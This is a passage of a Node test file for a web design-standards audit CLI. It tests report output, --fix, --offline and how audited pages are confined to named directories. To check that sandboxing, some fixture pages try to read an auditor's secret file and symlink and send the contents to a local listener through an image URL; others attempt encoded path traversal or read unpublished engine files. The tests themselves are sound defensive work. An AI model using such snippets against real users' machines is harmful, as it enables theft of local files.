  cpSync(join(ROOT, 'fonts'), join(root, 'fonts'), { recursive: true });
  for (const p of pages) copyFileSync(join(FIXTURES, p), join(at, p));
  return { dir, root, at };
};

let fixedRun = null;
const runFixed = () => {
  if (fixedRun) return fixedRun;
  const { dir } = site();
  const out = join(dir, 'report.html');
  // The pages carry long names (site/test/fixtures/report/…): the longest unbroken strings the
  // report has to set at 320px.
  const r = standards(['site', 'site/test/fixtures/report/missing.html', '--fix', '--widths', '320,1280', '--json', '--out', out], dir);
  fixedRun = { r, out, dir, json: r.stdout ? JSON.parse(r.stdout) : null };
  return fixedRun;
};

test('on the fixtures: four pages named, three loaded, one clean before and two after, five of six findings fixed', { skip }, () => {
  const { r, json } = runFixed();
  assert.equal(r.status, 1, `violations remain and a page did not load, so the run fails\n${r.stderr}`);
  const a = json.aggregate;
  assert.equal(a.pages, 4);
  assert.equal(a.loaded, 3);
  assert.equal(a.notLoaded.length, 1);
  assert.match(a.notLoaded[0].input, /missing\.html$/);
  assert.match(a.notLoaded[0].error, /no such file/);
  assert.deepEqual(a.clean, { before: 1, after: 2 });
  assert.deepEqual(a.findings, { before: 6, after: 1, fixed: 5, introduced: 0 });
  assert.deepEqual(a.violations, { before: 12, after: 2 });
  assert.deepEqual(a.fixedWithoutModel, { findings: 5, of: 6, share: 0.833 });
  const byRule = Object.fromEntries(a.byRule.map((x) => [x.rule, x]));
  assert.deepEqual(Object.keys(byRule).sort(), ['heading-order', 'link-not-underlined', 'radius-present', 'shadow-present', 'target-size']);
  assert.deepEqual(byRule['shadow-present'].pages, { before: 2, after: 0 });
  assert.deepEqual(byRule['heading-order'].findings, { before: 1, after: 1 });
  const stubborn = json.pages.find((p) => p.name.endsWith('stubborn.html'));
  assert.deepEqual(stubborn.remaining.map((f) => [f.rule, f.selectors.length > 0]), [['heading-order', true]]);
  assert.equal(stubborn.remaining[0].value, 'h1 to h4');
  assert.deepEqual(json.widths, [320, 1280]);
  assert.equal(json.pages.length, 4);
});

test('the report is written as one self-contained file', { skip }, () => {
  const { out } = runFixed();
  assert.ok(existsSync(out));
  const html = readFileSync(out, 'utf8');
  assert.doesNotMatch(html, /<link[^>]+stylesheet/, 'no external stylesheet');
  assert.doesNotMatch(html, /<script/, 'no script');
  assert.match(html, /class="af-provenance"/);
  assert.match(html, /not a WCAG/);
  assert.match(html, /missing\.html/);
  assert.match(html, /npx @appliedform\/standards@4 audit site site\/test\/fixtures\/report\/missing\.html --fix --widths 320,1280/);
  assert.match(html, /<meta name="generator" content="standards audit">/);
});

test('the report lints clean under the house system at every fixed width', { skip }, async () => {
  const { out, dir } = runFixed();
  // Linted where it was written and from nowhere else, as a client would open it.
  const copy = join(dir, 'copy', 'report.html');
  mkdirSync(join(dir, 'copy'));
  copyFileSync(out, copy);
  const results = await lintPages([pathToFileURL(copy).href], { browser, viewports: VIEWPORTS, fileRoots: [] });
  assert.equal(results.length, VIEWPORTS.length);
  for (const res of results) {
    assert.equal(res.spec.register, 'ii');
    assert.equal(res.spec.assumedRegister ?? false, false);
    assert.deepEqual(res.violations.map((v) => `${v.rule}: ${v.message}`), [], `report @ ${res.viewport}px`);
  }
});

test('without --fix the report has no after, and a clean directory exits 0', { skip }, () => {
  const { dir, at } = site(['clean.html']);
  copyFileSync(join(at, 'clean.html'), join(at, 'clean.fixed.html'));
  const r = standards(['site', '--widths', '320', '--json'], dir);
  assert.equal(r.status, 0, r.stdout + r.stderr);
  const json = JSON.parse(r.stdout);
  assert.equal(json.fix, false);
  assert.equal(json.aggregate.pages, 1, 'a page standards fix wrote is not counted as a page of the set');
  assert.deepEqual(json.aggregate.clean, { before: 1, after: null });
  assert.equal(json.pages[0].remaining, null);
  assert.deepEqual([json.pages[0].incomplete, json.pages[0].failed], [false, []], 'everything the page asked for was inside what was named');
  assert.ok(!existsSync(join(dir, 'standards-audit.html')), '--json alone writes no HTML');
  // From somewhere else, a page is named from the directory it was found in, so a report sent on
  // does not carry the auditor's home directory.
  const elsewhere = standards([join(dir, 'site'), '--widths', '320', '--json'], workspace());
  assert.equal(elsewhere.status, 0, elsewhere.stderr);
  assert.deepEqual(JSON.parse(elsewhere.stdout).pages.map((p) => p.name), ['site/test/fixtures/report/clean.html']);
});

// ---------------------------------------------------------------------------------------------
// Other people's pages: what they may read, what did not load, and what counts as a page

const LEAK = 'TOPSECRET-987';

test('a page that reads a file in the working directory outside every root is refused, and the refusal is listed', { skip }, async () => {
  const dir = workspace();
  writeFileSync(join(dir, 'secret.txt'), LEAK);
  mkdirSync(join(dir, 'client'));
  // Inside the directory named: a file of its own, which it may read, and a link to the auditor's
  // file, which leads outside and is refused.
  writeFileSync(join(dir, 'client', 'own.txt'), 'OWNFILE');
  symlinkSync(join(dir, 'secret.txt'), join(dir, 'client', 'link.txt'));
  const listener = await serve(() => ({}));
  // The page fetches the auditor's file, and reads it (synchronously, so what it read is on the page
  // before it is measured) by a relative path, by an absolute one and through the link. What it
  // reads is set as a paragraph's font family, which the report quotes as an off-system font, and
  // sent to a listener, since the network is on.
  const page = `<!doctype html><html lang="en" data-register="ii"><head><meta charset="utf-8"><title>t</title></head>
<body><main><h1>Title</h1></main><script>
const put = (t) => { const p = document.createElement('p'); p.textContent = 'x'; p.style.fontFamily = t; document.querySelector('main').append(p); new Image().src = '${listener.origin}/leak?d=' + encodeURIComponent(t); };
const read = (u) => { try { const x = new XMLHttpRequest(); x.open('GET', u, false); x.send(); return x.responseText || 'nothing'; } catch { return 'refused'; } };
fetch('../secret.txt').then((r) => r.text()).then(put, () => {});
for (const u of ['../secret.txt', ${JSON.stringify(pathToFileURL(join(dir, 'secret.txt')).href)}, 'link.txt', 'own.txt']) put(read(u));
</script></body></html>`;
  writeFileSync(join(dir, 'client', 'page.html'), page);
  // Named as a directory, and named alone: either way the page reads its own directory, not the
  // working directory above it.
  const runs = [];
  for (const args of [['client'], ['client/page.html']]) {
    const out = join(dir, `report-${runs.length}.html`);
    runs.push({ args, out, r: await standardsAsync([...args, '--widths', '320', '--json', '--out', out], dir) });
  }
  await listener.close();
  assert.ok(listener.hits.some((h) => h.includes('OWNFILE')), `the network was on and the control was sent\n${listener.hits.join('\n')}`);
  assert.ok(!listener.hits.some((h) => h.includes(LEAK)), listener.hits.join('\n'));
  for (const { args, out, r } of runs) {
    assert.ok(r.stdout, r.stderr);
    assert.ok(r.stdout.includes('OWNFILE'), `the page read its own file, and the report quotes what it read (${args})`);
    assert.ok(!r.stdout.includes(LEAK), `the JSON does not carry the file (${args})`);
    assert.ok(!readFileSync(out, 'utf8').includes(LEAK), `the report does not carry the file (${args})`);
    const [p] = JSON.parse(r.stdout).pages;
    assert.equal(p.loaded, true, args.join(' '));
    // A data file refused is listed; it is not a stylesheet, script or font, so the page is measured.
    assert.equal(p.incomplete, false, args.join(' '));
    // A fetch() of a file URL is a request in full Chromium, refused and listed here; Chromium's headless
    // shell rejects it inside the page and makes no request. Either way nothing is read (above).
    assert.deepEqual(p.failed.filter((f) => f.type !== 'fetch'), [
      { resource: 'client/link.txt', type: 'xhr', why: REFUSED.file },
      { resource: 'secret.txt', type: 'xhr', why: REFUSED.file },
    ], args.join(' '));
    assert.ok(p.failed.filter((f) => f.type === 'fetch').every((f) => f.resource === 'secret.txt' && f.why === REFUSED.file), JSON.stringify(p.failed));
    assert.match(readFileSync(out, 'utf8'), /Requests that did not load on client\/page\.html/);
  }
});

/** The clean fixture, its stylesheet and fonts at <name>/dist and <name>/fonts, with the page at <name>/<page>. */
const flatSite = (dir, name, page = 'index.html') => {
  const root = join(dir, name);
  mkdirSync(join(root, 'dist'), { recursive: true });
  copyFileSync(join(ROOT, 'dist/tokens.css'), join(root, 'dist/tokens.css'));
  cpSync(join(ROOT, 'fonts'), join(root, 'fonts'), { recursive: true });
  mkdirSync(dirname(join(root, page)), { recursive: true });
  const up = '../'.repeat(page.split('/').length - 1);
  writeFileSync(join(root, page), readFileSync(join(FIXTURES, 'clean.html'), 'utf8').replace('../../../dist/tokens.css', `${up}dist/tokens.css`));
  return root;
};

test('a stylesheet linked into a directory named from outside every root is refused and listed by standards audit; standards lint reads it as before', { skip }, async () => {
  const dir = workspace();
  const outside = mkdtempSync(join(tmpdir(), 'af-shared-'));
  writeFileSync(join(outside, 'pale.css'), '.pale { color: #d0d0d0; }\n');
  const root = flatSite(dir, 'linked');
  symlinkSync(join(outside, 'pale.css'), join(root, 'pale.css'));
  const page = join(root, 'index.html');
  writeFileSync(page, readFileSync(page, 'utf8')
    .replace('</head>', '<link rel="stylesheet" href="pale.css">\n</head>')
    .replace('</main>', '<p class="pale">A pale paragraph, coloured by a stylesheet linked in from elsewhere.</p></main>'));
  const pale = (values) => /#d0d0d0/i.test(values);
  // standards lint calls lintPages with its own roots and no realpaths: the link is read, as on 49bda4e.
  const [asLint] = await lintPages([pathToFileURL(page).href], { browser, viewports: [320] });
  assert.ok(asLint.violations.some((v) => v.rule === 'contrast' && pale(`${v.text?.color} ${v.message}`)), JSON.stringify(asLint.violations.map((v) => v.rule)));
  // standards audit checks where the link leads: outside every root, so it is refused, listed, and the
  // page is measured incomplete, with or without the fixer.
  for (const fix of [[], ['--fix']]) {
    const r = standards(['linked', ...fix, '--widths', '320', '--json'], dir);
    assert.equal(r.status, 1, r.stdout + r.stderr);
    const [p] = JSON.parse(r.stdout).pages;
    assert.deepEqual([p.loaded, p.incomplete, p.clean.before], [true, true, false], fix.join(' '));
    assert.deepEqual(p.failed, [{ resource: 'linked/pale.css', type: 'stylesheet', why: REFUSED.file }], fix.join(' '));
    assert.ok(!p.findings.some((f) => f.rule === 'contrast' && pale(f.values.join(' '))), 'the refused stylesheet was not measured');
  }
});

test('a refused request by an encoded path does not show the auditor\'s directories', { skip }, () => {
  const dir = workspace();
  const root = flatSite(dir, 'enc');
  const page = join(root, 'index.html');
  writeFileSync(page, readFileSync(page, 'utf8').replace('</head>', '<link rel="stylesheet" href="..%2f..%2foutside%2fpale.css">\n</head>'));
  const out = join(dir, 'enc.html');
  const r = standards(['enc', '--widths', '320', '--json', '--out', out], dir);
  const [p] = JSON.parse(r.stdout).pages;
  const row = p.failed.find((f) => f.type === 'stylesheet');
  assert.ok(row, JSON.stringify(p.failed));
  for (const text of [JSON.stringify(row), readFileSync(out, 'utf8')]) assert.ok(!text.includes(dir) && !text.includes(tmpdir()), row.resource);
});

test('a page named alone reads the files beside it, in whatever order it is named and from wherever', { skip }, () => {
  const dir = workspace();
  const root = flatSite(dir, 'clean');
  for (const args of [['clean/index.html'], ['clean/index.html', 'clean'], ['clean', 'clean/index.html']]) {
    const r = standards([...args, '--widths', '320', '--json'], dir);
    assert.equal(r.status, 0, `${args.join(' ')}\n${r.stdout}${r.stderr}`);
    assert.deepEqual(JSON.parse(r.stdout).pages.map((p) => [p.name, p.loaded, p.clean.before, p.failed]), [['clean/index.html', true, true, []]], args.join(' '));
  }
  // From its own directory, which is then the working directory: it reads the directory it sits in,
  // and a warning says so, once.
  const alone = standards(['index.html', '--widths', '320', '--json'], root);
  assert.equal(alone.status, 0, alone.stdout + alone.stderr);
  const warning = /^standards audit: warning: index\.html sits in the working directory and was named alone, so it may read every file in and below the working directory$/m;
  assert.match(alone.stderr, warning);
  assert.equal(alone.stderr.split('\n').filter((l) => /warning/.test(l)).length, 1, alone.stderr);
  // From a directory below its own, the working directory is inside what it reads too, and the
  // warning says so. Outside the working directory, it is named from its own directory's parent.
  const below = standards(['../index.html', '--widths', '320', '--json'], join(root, 'dist'));
  assert.equal(below.status, 0, below.stdout + below.stderr);
  assert.match(below.stderr, /^standards audit: warning: clean\/index\.html sits above the working directory and was named alone, so it may read every file in and below its own directory, the working directory included$/m);
  assert.equal(below.stderr.split('\n').filter((l) => /warning/.test(l)).length, 1, below.stderr);
  assert.deepEqual(JSON.parse(below.stdout).pages.map((p) => p.name), ['clean/index.html']);
  // Named with its directory, or named alone from above or beside it, or with the working directory
  // given as a --root, it reads no more than it was given: no warning.
  assert.doesNotMatch(standards(['.', '--widths', '320', '--json'], root).stderr, /warning/);
  assert.doesNotMatch(standards(['clean/index.html', '--widths', '320', '--json'], dir).stderr, /warning/);
  mkdirSync(join(dir, 'beside'));
  assert.doesNotMatch(standards(['../clean/index.html', '--widths', '320', '--json'], join(dir, 'beside')).stderr, /warning/);
  assert.doesNotMatch(standards(['../index.html', '--root', '.', '--widths', '320', '--json'], join(root, 'dist')).stderr, /warning/);
});

test('the one-page command gives a directory named beside the page only when the page asked for a file there, and names the page as the set does', { skip }, () => {
  const dir = workspace();
  flatSite(dir, 'a');
  flatSite(dir, 'b');
  // The page in a also loads a stylesheet from b, a directory named beside its own; the page in b
  // asks for nothing in a.
  const pageA = join(dir, 'a', 'index.html');
  writeFileSync(pageA, readFileSync(pageA, 'utf8').replace('</head>', '<link rel="stylesheet" href="../b/dist/tokens.css">\n</head>'));
  const client = join(dir, 'client');
  mkdirSync(client);
  const r = standards(['../a', '../b', '--widths', '320', '--json'], client);
  assert.equal(r.status, 0, r.stdout + r.stderr);
  const json = JSON.parse(r.stdout);
  assert.deepEqual(json.pages.map((p) => [p.name, p.failed, p.command]), [
    ['a/index.html', [], 'npx @appliedform/standards@4 audit ../a/index.html --root ../b --widths 320'],
    ['b/index.html', [], 'npx @appliedform/standards@4 audit ../b/index.html --widths 320'],
  ]);
  // Each command, run where the set was run, measures its page as the set did and names it the same way.
  for (const p of json.pages) {
    const again = standards([...p.command.replace(/^npx @appliedform\/standards@4 audit /, '').split(' '), '--json'], client);
    assert.equal(again.status, 0, again.stdout + again.stderr);
    const [q] = JSON.parse(again.stdout).pages;
    assert.deepEqual([q.name, q.failed, q.findings, q.command], [p.name, p.failed, p.findings, p.command]);
  }
});

test('a page in a directory named loads ../css from inside it; named alone, it is refused that file and measured incomplete', { skip }, () => {
  const dir = workspace();
  const root = flatSite(dir, 'site', 'pages/index.html');
  mkdirSync(join(root, 'css'));
  writeFileSync(join(root, 'css', 'pale.css'), '.pale { color: #d0d0d0; }\n');
  const page = join(root, 'pages', 'index.html');
  writeFileSync(page, readFileSync(page, 'utf8')
    .replace('</head>', '<link rel="stylesheet" href="../css/pale.css">\n</head>')
    .replace('</main>', '<p class="pale">A pale paragraph, coloured by a stylesheet one directory up.</p></main>'));
  // The colour comes from ../css: the contrast finding shows the stylesheet loaded.
  const wholeOut = join(dir, 'whole.html');
  const whole = standards(['site', '--widths', '320', '--json', '--out', wholeOut], dir);
  const [p] = JSON.parse(whole.stdout).pages;
  assert.deepEqual([p.name, p.loaded, p.incomplete, p.failed], ['site/pages/index.html', true, false, []], whole.stderr);
  assert.match(p.findings.find((f) => f.rule === 'contrast')?.values.join(' ') ?? '', /#d0d0d0/i, JSON.stringify(p.findings));
  // The page read the directory named above its own, so the command that measures it alone names
  // that directory with --root, and measures what the set did.
  assert.equal(p.command, 'npx @appliedform/standards@4 audit site/pages/index.html --root site --widths 320');
  assert.ok(readFileSync(wholeOut, 'utf8').includes(`<span data-voice="data">${p.command}</span>`), 'the report gives the page its own command');
  const again = standards([...p.command.replace(/^npx @appliedform\/standards@4 audit /, '').split(' '), '--json'], dir);
  assert.equal(again.status, whole.status, again.stdout + again.stderr);
  const [q1] = JSON.parse(again.stdout).pages;
  assert.deepEqual([q1.loaded, q1.incomplete, q1.failed, q1.findings], [p.loaded, p.incomplete, p.failed, p.findings]);
  // --offline and --root reach both commands.
  const offline = JSON.parse(standards(['site', '--root', 'site/css', '--offline', '--widths', '320', '--json'], dir).stdout);
  assert.equal(offline.command, 'npx @appliedform/standards@4 audit site --root site/css --offline --widths 320');
  assert.equal(offline.pageCommand, 'npx @appliedform/standards@4 audit <page> --root site/css --widths 320 --offline');
  assert.equal(offline.pages[0].command, 'npx @appliedform/standards@4 audit site/pages/index.html --root site --root site/css --widths 320 --offline');
  // Named alone it reads site/pages only, so both stylesheets one directory up are refused.
  const out = join(dir, 'alone.html');
  const alone = standards(['site/pages/index.html', '--widths', '320', '--json', '--out', out], dir);
  assert.equal(alone.status, 1, alone.stdout + alone.stderr);
  const json = JSON.parse(alone.stdout);
  const [q] = json.pages;
  assert.deepEqual([q.loaded, q.incomplete, q.clean.before], [true, true, false]);
  assert.deepEqual(q.failed, [
    { resource: 'site/css/pale.css', type: 'stylesheet', why: REFUSED.file },
    { resource: 'site/dist/tokens.css', type: 'stylesheet', why: REFUSED.file },
  ]);
  assert.ok(q.findings.length > 0, 'its findings are still reported');
  assert.equal(json.aggregate.clean.before, 0);
  assert.deepEqual(json.aggregate.incomplete.map((x) => x.input), ['site/pages/index.html']);
  const html = readFileSync(out, 'utf8');
  assert.match(html, /measured incomplete/);
  assert.match(html, /name the directory that holds the page's files/);
});

/** A server for a site: the page at /site/index.html, the house stylesheet and fonts, and 404 for anything else. */
const house = (page) => serve((req) => {
  const path = decodeURIComponent(new URL(req.url, 'http://x').pathname);
  if (path === '/site/index.html') return { body: page };
  if (path === '/dist/tokens.css') return { body: readFileSync(join(ROOT, 'dist/tokens.css')), type: 'text/css' };
  if (/^\/fonts\/[\w.-]+\.woff2$/.test(path) && existsSync(join(ROOT, path))) return { body: readFileSync(join(ROOT, path)), type: 'font/woff2' };
  return { status: 404, body: 'Not found' };
});

test('a page whose stylesheet is answered 404 is measured incomplete, listed with it, and not counted clean', { skip }, async () => {
  const page = readFileSync(join(FIXTURES, 'clean.html'), 'utf8')
    .replace('../../../dist/tokens.css', '/dist/tokens.css')
    .replace('</head>', '<link rel="stylesheet" href="/gone.css">\n</head>');
  const site = await house(page);
  const dir = workspace();
  const out = join(dir, 'report.html');
  const r = await standardsAsync([`${site.origin}/site/index.html`, '--widths', '320', '--json', '--out', out], dir);
  await site.close();
  assert.equal(r.status, 1, r.stdout + r.stderr);
  const json = JSON.parse(r.stdout);
  const [p] = json.pages;
  assert.deepEqual([p.loaded, p.incomplete, p.findings.length], [true, true, 0], 'it loaded, and nothing was found on it');
  assert.deepEqual(p.failed, [{ resource: `${site.origin}/gone.css`, type: 'stylesheet', why: 'HTTP 404' }]);
  assert.deepEqual(json.aggregate.clean, { before: 0, after: null }, 'a page with nothing found, measured without its stylesheet, is not clean');
  assert.deepEqual(json.aggregate.incomplete, [{ input: `${site.origin}/site/index.html`, failed: p.failed }]);
  // The report that says so is held to the gate it reports on, at every fixed width.
  for (const res of await lintPages([pathToFileURL(out).href], { browser, viewports: VIEWPORTS, fileRoots: [] })) {
    assert.deepEqual(res.violations.map((v) => `${v.rule}: ${v.message}`), [], `report @ ${res.viewport}px`);
  }
  assert.match(readFileSync(out, 'utf8'), /Measured incomplete/);
});

test('with --fix, a URL is judged loaded and complete on the page as found, not on the fixer’s copy', { skip }, async () => {
  // The fixer's copy is rendered from a file with the page's address as its base, so the fonts the
  // house stylesheet asks for are fetched across origins, from a server that sends no CORS header,
  // and fail. A visitor's browser loads them from the page's own origin. The page is clean as found.
  const page = readFileSync(join(FIXTURES, 'clean.html'), 'utf8').replace('../../../dist/tokens.css', '/dist/tokens.css');
  const site = await house(page);
  const runs = {};
  for (const fix of [[], ['--fix']]) runs[fix.join('') || 'found'] = await standardsAsync([`${site.origin}/site/index.html`, ...fix, '--widths', '320', '--json'], workspace());
  await site.close();
  const asFound = JSON.parse(runs.found.stdout).pages[0];
  const fixed = JSON.parse(runs['--fix'].stdout).pages[0];
  assert.deepEqual([asFound.loaded, asFound.incomplete, asFound.failed, asFound.clean.before], [true, false, [], true], runs.found.stderr);
  assert.deepEqual([fixed.loaded, fixed.incomplete, fixed.failed, fixed.clean.before], [true, false, [], true], runs['--fix'].stdout.slice(0, 3000));
  assert.equal(runs['--fix'].status, runs.found.status, '--fix does not change the exit status');
  assert.equal(runs.found.status, 0);
  assert.deepEqual(fixed.findings, asFound.findings, 'the findings as found are the same with the fixer');
});

const PALE = '.pale { color: #d0d0d0; }\n';
/** A link 12px square, which the fixer cures: in a header, so content written into main does not move it. */
const TINY = '<header><a href="#app" style="display: inline-block; width: 12px; height: 12px; overflow: hidden" aria-label="Back to the top"></a></header>';
/** A single-page app: the server sends a shell, a module script writes a heading and a fetch writes a pale paragraph. */
const spa = (header = '') => `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>An app</title></head>
<body>${header}<main id="app"><h1>An app</h1><p>Its shell, which the server sends.</p></main>
<script type="module" src="/spa/app.js"></script>
<script>const x = new XMLHttpRequest(); x.open('GET', '/spa/content.html', false); x.send(); document.querySelector('main').insertAdjacentHTML('beforeend', x.responseText);</script>
</body></html>`;
const APP = {
  '/spa/index.html': { body: spa() },
  '/spa/patched.html': { body: spa(TINY) },
  '/spa/app.js': { type: 'text/javascript', body: `document.querySelector('main').insertAdjacentHTML('beforeend', '<h4>A heading the module wrote, two levels down</h4>');` },
  '/spa/content.html': { body: '<p style="color: #d0d0d0">Pale text the page fetched from its server.</p>' },
  // A page with a base of its own, and a stylesheet given from the root of the site.
  '/base/index.html': { body: `<!doctype html><html lang="en"><head><meta charset="utf-8"><base href="/"><title>A page with its own base</title><link rel="stylesheet" href="/base/site.css"></head>
<body><main><h1>A page with its own base</h1><p class="pale">Pale text coloured by a stylesheet given from the root.</p></main></body></html>` },
  '/base/site.css': { type: 'text/css', body: PALE },
};

test('with --fix, a page the fixer applied nothing to is cured of nothing, though a copy of it would lose a module script, fetched content or a root-relative stylesheet', { skip }, async () => {
  const server = await serve((req) => APP[new URL(req.url, 'http://x').pathname] ?? { status: 404, body: 'Not found' });
  const urls = ['/spa/index.html', '/base/index.html', '/spa/patched.html'].map((p) => `${server.origin}${p}`);
  const r = await standardsAsync([...urls, '--fix', '--widths', '320', '--json'], workspace());
  await server.close();
  assert.ok(r.stdout, r.stderr);
  const json = JSON.parse(r.stdout);
  const [app, based, patched] = json.pages;
  const rules = (p) => p.findings.map((f) => f.rule);
  // As found, each page loaded everything it asked for, and what its scripts wrote was measured.
  for (const p of json.pages) assert.deepEqual([p.loaded, p.incomplete, p.failed], [true, false, []], p.input);
  assert.deepEqual(rules(app), ['contrast', 'heading-order']);
  assert.deepEqual(rules(based), ['contrast']);
  assert.deepEqual(rules(patched), ['contrast', 'heading-order', 'target-size']);
  // The fixer applied nothing to the first two, so nothing on them is cured, and they are not clean with the fixes.
  for (const p of [app, based]) {
    assert.deepEqual(p.fixer.applied, [], p.input);
    assert.deepEqual(p.findings.map((f) => f.fixed), p.findings.map(() => false), p.input);
    assert.deepEqual(p.remaining.map((f) => f.rule), rules(p), p.input);
    assert.deepEqual([p.clean.after, p.fixer.rulesFixed], [false, []], p.input);
  }
  // On the third it cured the link, and the page with that fix, at its own address, still has what the scripts wrote.
  assert.ok(patched.fixer.applied.length > 0, JSON.stringify(patched.fixer));
  assert.deepEqual(patched.findings.map((f) => [f.rule, f.fixed]), [['contrast', false], ['heading-order', false], ['target-size', true]]);
  assert.deepEqual([patched.fixedRender.comparable, patched.fixedRender.lost], [true, []]);
  assert.deepEqual(patched.fixer.rulesFixed, ['target-size']);
  assert.deepEqual(json.aggregate.findings, { before: 6, after: 5, fixed: 1, introduced: 0 });
  assert.deepEqual(json.aggregate.clean, { before: 0, after: 0 });
});

test('with --fix, a page that loses a stylesheet when it is rendered with the fixes is not compared, and nothing on it is counted fixed', { skip }, async () => {
  const page = `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Lossy</title><link rel="stylesheet" href="/lossy/site.css"></head>
<body>${TINY}<main id="app"><h1>A page whose stylesheet stops loading</h1><p class="pale">Pale text coloured by its stylesheet.</p></main></body></html>`;
  // The stylesheet is answered as many times as the page as found asks for it, and not after.
  let served = 0, limit = Infinity;
  const server = await serve((req) => {
    const path = new URL(req.url, 'http://x').pathname;
    if (path === '/lossy/index.html') return { body: page };
    if (path === '/lossy/site.css') return (served += 1) <= limit ? { type: 'text/css', body: PALE } : { status: 503, body: 'Unavailable' };
    return { status: 404, body: 'Not found' };
  });
  const url = `${server.origin}/lossy/index.html`;
  const dir = workspace();
  const asFound = await standardsAsync([url, '--widths', '320', '--json'], dir);
  limit = served;
  served = 0;
  const out = join(dir, 'report.html');
  const r = await standardsAsync([url, '--fix', '--widths', '320', '--json', '--out', out], dir);
  await server.close();
  assert.ok(r.stdout, r.stderr);
  const json = JSON.parse(r.stdout);
  const [p] = json.pages;
  assert.deepEqual([p.loaded, p.incomplete, p.failed], [true, false, []], 'as found, the stylesheet loaded');
  assert.deepEqual(p.findings.map((f) => f.rule), JSON.parse(asFound.stdout).pages[0].findings.map((f) => f.rule));
  assert.deepEqual(p.findings.map((f) => f.rule), ['contrast', 'target-size']);
  assert.ok(p.fixer.applied.length > 0, 'the fixer applied a fix, so the page was rendered with it');
  const lost = [{ resource: `${server.origin}/lossy/site.css`, type: 'stylesheet', why: 'HTTP 503' }];
  assert.deepEqual([p.fixedRender.comparable, p.fixedRender.lost], [false, lost]);
  assert.deepEqual(p.findings.map((f) => f.fixed), [null, null], 'neither finding is judged fixed or not');
  assert.deepEqual([p.remaining, p.clean.after, p.fixer.rulesFixed], [null, false, []]);
  // The set counts the page as found: nothing fixed, nothing introduced.
  assert.deepEqual(json.aggregate.findings, { before: 2, after: 2, fixed: 0, introduced: 0, notCompared: 2 });
  assert.deepEqual(json.aggregate.notComparable, [{ input: url, lost, error: null }]);
  assert.equal(r.status, 1);
  const html = readFileSync(out, 'utf8');
  assert.match(html, /not comparable/);
  assert.match(html, /<dt>Not compared with the fixes<\/dt>/);
  for (const res of await lintPages([pathToFileURL(out).href], { browser, viewports: VIEWPORTS, fileRoots: [] })) {
    assert.deepEqual(res.violations.map((v) => `${v.rule}: ${v.message}`), [], `report @ ${res.viewport}px`);
  }
});

test('the network is on by default, and --offline blocks a request over it and lists it', { skip }, async () => {
  const dir = workspace();
  const root = flatSite(dir, 'cdnsite');
  const cdn = await serve(() => ({ type: 'text/javascript', body: 'document.querySelector("main").insertAdjacentHTML("beforeend", "<p style=\\"color: #d0d0d0\\">Written by a script from elsewhere.</p>");' }));
  writeFileSync(join(root, 'index.html'), readFileSync(join(root, 'index.html'), 'utf8').replace('</main>', `</main>\n<script src="${cdn.origin}/inject.js"></script>`));
  const online = await standardsAsync(['cdnsite', '--widths', '320', '--json'], dir);
  const hits = cdn.hits.length;
  const offline = await standardsAsync(['cdnsite', '--offline', '--widths', '320', '--json'], dir);
  await cdn.close();
  // Online, the script loaded and what it wrote was measured.
  assert.ok(hits > 0, 'the page reached the network');
  const [on] = JSON.parse(online.stdout).pages;
  assert.deepEqual([on.loaded, on.incomplete, on.failed], [true, false, []]);
  assert.ok(on.findings.some((f) => f.rule === 'contrast'), JSON.stringify(on.findings.map((f) => f.rule)));
  // Offline, the request did not leave, and the page is measured without its script.
  assert.equal(cdn.hits.length, hits, 'no request left with --offline');
  assert.equal(offline.status, 1, offline.stdout + offline.stderr);
  const json = JSON.parse(offline.stdout);
  const [off] = json.pages;
  assert.deepEqual([off.loaded, off.incomplete, off.clean.before], [true, true, false]);
  assert.deepEqual(off.failed, [{ resource: `${cdn.origin}/inject.js`, type: 'script', why: REFUSED.network }]);
  assert.equal(json.offline, true);
  assert.match(json.command, / --offline /);
});

test('a page inside the engine reads the engine’s published files and no others, as the reference pages do', { skip }, () => {
  // A page inside the engine that reads the engine's published stylesheet; the open tree ships it too.
  const r = standards(['test/fixtures/report/clean.html', '--widths', '1280', '--json'], ROOT);
  assert.equal(r.status, 0, r.stdout.slice(0, 2000) + r.stderr);
  const [page] = JSON.parse(r.stdout).pages;
  assert.deepEqual([page.loaded, page.clean.before, page.failed], [true, true, []]);
  // A page in dist/ asks for files of the engine that are not published, and one that is. The engine
  // is a scratch copy of it: a page written into this repository's dist/ is read by every other test
  // file and copied by scripts/build-site.mjs while it stands there. package.json, which names the
  // published files, is copied; CLAUDE.md and .gitignore are the unpublished files the page asks for.
  // The open tree (scripts/export-open.mjs) has no assets/ and no CLAUDE.md, so a directory is
  // copied only where this tree has it and an unpublished file this tree lacks is written, so the
  // page still asks for a file that exists.
  const engine = mkdtempSync(join(tmpdir(), 'af-audit-engine-'));
  try {
    for (const d of ['bin', 'scripts', 'src', 'tokens', 'fonts', 'assets', 'docs']) if (existsSync(join(ROOT, d))) cpSync(join(ROOT, d), join(engine, d), { recursive: true });
    copyFileSync(join(ROOT, 'package.json'), join(engine, 'package.json'));
    for (const f of ['CLAUDE.md', '.gitignore']) {
      if (existsSync(join(ROOT, f))) copyFileSync(join(ROOT, f), join(engine, f));
      else writeFileSync(join(engine, f), 'an unpublished file of the engine\n');
    }
    symlinkSync(join(ROOT, 'node_modules'), join(engine, 'node_modules'), 'junction');
    const dir = join(engine, 'dist', 'af-audit-test');
    mkdirSync(dir, { recursive: true });
    copyFileSync(join(ROOT, 'dist/tokens.css'), join(engine, 'dist/tokens.css'));
    writeFileSync(join(dir, 'page.html'), `<!doctype html><html lang="en" data-register="ii"><head><meta charset="utf-8"><title>t</title><link rel="stylesheet" href="../tokens.css"></head>
<body><main><h1>Title</h1></main><script>for (const u of ['../../package.json', '../../CLAUDE.md', '../../.gitignore']) { try { const x = new XMLHttpRequest(); x.open('GET', u, false); x.send(); } catch {} }</script></body></html>`);
    const r2 = standards([join('dist', 'af-audit-test', 'page.html'), '--widths', '320', '--json'], engine, join(engine, 'bin/standards.mjs'));
    const [p] = JSON.parse(r2.stdout).pages;
    assert.equal(p.incomplete, false, 'the stylesheet, which is published, loaded');
    assert.deepEqual(p.failed, ['.gitignore', 'CLAUDE.md', 'package.json'].map((resource) => ({ resource, type: 'xhr', why: REFUSED.file })));
  } finally {
    rmSync(engine, { recursive: true, force: true });
  }
});

test('a refused request a page makes after its load event is still heard and listed', { skip }, async () => {
  // The page asks for a file outside every root only after it has loaded and after a local server has
  // answered it, as a script fetching data late does (by XMLHttpRequest: Chromium's headless shell,
